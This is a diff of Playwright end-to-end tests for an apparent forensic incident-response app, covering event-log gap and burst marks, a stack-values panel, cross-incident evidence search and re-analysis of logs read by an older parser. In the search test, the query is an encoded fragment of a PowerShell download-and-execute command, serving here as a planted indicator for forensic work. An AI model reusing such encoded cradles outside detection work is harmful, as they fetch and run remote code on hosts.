+  await expect(page.getByRole('combobox', { name: 'Burst ≥' })).toHaveValue('10')
+  // And "Show gaps and bursts" switches the marks off.
+  await page.getByRole('checkbox', { name: 'Show gaps and bursts' }).uncheck()
+  await expect(page.getByRole('combobox', { name: 'Gap ≥' })).toBeDisabled()
+  await page.getByRole('checkbox', { name: 'Show gaps and bursts' }).check()
+  await page.getByRole('combobox', { name: 'Gap ≥' }).selectOption({ label: '2 h' })
+  await page.getByRole('combobox', { name: 'Burst ≥' }).selectOption({ label: '5× usual' })
+
+  expect((await page.request.delete('/api/incidents/e2e-s7-gap')).status()).toBe(204)
+  await backToMain()
+})
+
+test('the stack panel shows the shares and the first and last seen, sorts A to Z and copies as TSV', async () => {
+  test.setTimeout(300_000)
+  await page.setViewportSize({ width: 1440, height: 900 })
+  await openFreshIncidentOf('e2e-s7-stack', 'WKS-GAP-01', 'windows')
+  await openEvidence('Event Logs')
+  await addEvidence('nik-eventlogs.json', GAP_LOG)
+  await page.getByRole('tab', { name: /^Events/ }).click()
+  await page.getByRole('button', { name: 'Show all events' }).click()
+  await expect(recordsTable().locator('tbody tr').first()).toBeVisible({ timeout: 30_000 })
+  await page
+    .getByRole('columnheader', { name: /^Event ID/ })
+    .getByRole('button')
+    .first()
+    .click()
+  await page.getByRole('menuitem', { name: /Stack values/ }).click()
+  const panel = page.getByRole('dialog', { name: /Stack values: Event ID/ })
+  await expect(panel).toBeVisible()
+  await expect(panel.getByRole('columnheader', { name: 'Share' })).toBeVisible()
+  await expect(panel.getByRole('columnheader', { name: 'First seen' })).toBeVisible()
+  await expect(panel.getByRole('row').filter({ hasText: '1000' })).toContainText('100%', { timeout: 20_000 })
+  await expect(panel).toContainText('The values seen the fewest times are at the top')
+  await panel.getByRole('button', { name: 'A → Z' }).click()
+  await expect(panel).toContainText('The values in alphabetical order')
+  await shot('stack-panel', panel)
+  await page.context().grantPermissions(['clipboard-read', 'clipboard-write'])
+  await panel.getByRole('button', { name: 'Copy as TSV' }).click()
+  await expect(panel.getByRole('button', { name: 'Copied' })).toBeVisible()
+  const copied = await page.evaluate(() => navigator.clipboard.readText())
+  expect(copied.split('\n')[0]).toBe('Event ID\tcount\tshare\tfirst seen\tlast seen')
+  expect(copied).toContain('1000\t')
+  // A click on a value filters on it.
+  await panel.getByRole('button', { name: '1000', exact: true }).click()
+  await expect(panel).toBeHidden()
+
+  expect((await page.request.delete('/api/incidents/e2e-s7-stack')).status()).toBe(204)
+  await backToMain()
+})
+
+test('the search finds a record of evidence in any incident and opens its page with the record in the Source viewer', async () => {
+  test.setTimeout(300_000)
+  await page.setViewportSize({ width: 1440, height: 900 })
+  await openFreshIncidentOf('e2e-s7-search', 'WKS-GAP-01', 'windows')
+  await openEvidence('Event Logs')
+  await addEvidence('nik-eventlogs.json', PROCESS_LOG)
+  await expect(recordsTable().locator('tbody tr').first()).toBeVisible({ timeout: 30_000 })
+  // From another page of the app: the Summary of the main incident.
+  await backToMain()
+  await page.keyboard.press('Control+k')
+  const palette = page.getByRole('dialog', { name: 'Search' })
+  await expect(palette).toBeVisible()
+  await palette.getByRole('textbox', { name: 'Search' }).fill('SQBFAFgAIAAoAE4A')
+  const hit = palette.getByRole('option').filter({ hasText: 'nik-eventlogs.json' }).first()
+  await expect(hit).toBeVisible({ timeout: 30_000 })
+  await expect(palette).toContainText('Evidence — all incidents')
+  await expect(hit.locator('mark')).toContainText('SQBFAFgAIAAoAE4A')
+  await shot('palette-evidence', palette)
+  await page.keyboard.press('Enter')
+  // The page of its section opens, with the original of the record in the Source viewer.
+  const viewer = page.getByRole('dialog', { name: 'Source of the record' })
+  await expect(viewer).toBeVisible({ timeout: 30_000 })
+  await expect(viewer).toContainText('nik-eventlogs.json')
+  await expect(page).toHaveURL(/e2e-s7-search/)
+  await page.keyboard.press('Escape')
+  await expect(sourcesTable()).toBeVisible()
+
+  expect((await page.request.delete('/api/incidents/e2e-s7-search')).status()).toBe(204)
+  await backToMain()
+})
+
+test('a log read by an older parser says so and offers to be analysed again', async () => {
+  test.setTimeout(240_000)
+  await page.setViewportSize({ width: 1440, height: 900 })
+  await openFreshIncidentOf('e2e-s7-old', 'WKS-GAP-01', 'windows')
+  await openEvidence('Event Logs')
+  await addEvidence('nik-eventlogs.json', GAP_LOG)
+  // The server holds version 2 of every parser: the list the page reads is made to say the file was read by version 1.
+  await page.route(/\/api\/incidents\/e2e-s7-old\/evidence\/sources\?/, async (route) => {
+    const response = await route.fetch()
+    const body = await response.json()
+    for (const source of body.sources ?? []) source.parserVersion = '1'
+    return route.fulfill({ response, json: body })
+  })
+  let again = 0
+  await page.route('**/api/incidents/e2e-s7-old/evidence/sources/*/again', async (route) => {
+    again += 1
+    return route.continue()
+  })
+  await page.reload()
+  await openEvidence('Event Logs')
+  const row = sourceRow('nik-eventlogs.json')
+  await expect(row).toContainText('Read before processes and logons were extracted', { timeout: 30_000 })
+  await shot('sources-analyse-again', sourcesTable())
+  await row.getByRole('button', { name: 'Analyse again' }).click()
+  await expect.poll(() => again, { timeout: 20_000 }).toBe(1)
+  await page.unroute(/\/api\/incidents\/e2e-s7-old\/evidence\/sources\?/)
+  await page.unroute('**/api/incidents/e2e-s7-old/evidence/sources/*/again')
+
+  // The file is being read again: the page is left, and the incident goes once the reading has ended.
+  await backToMain()
+  await expect
+    .poll(
+      async () => {
+        const listed = await (await page.request.get('/api/incidents/e2e-s7-old/evidence/sources?kind=eventlog')).json()
+        return (listed.sources ?? []).every((source) => source.state !== 'queued' && source.state !== 'parsing')
+      },
+      { timeout: 60_000 },
+    )
+    .toBe(true)
+  expect((await page.request.delete('/api/incidents/e2e-s7-old')).status()).toBe(204)
 })
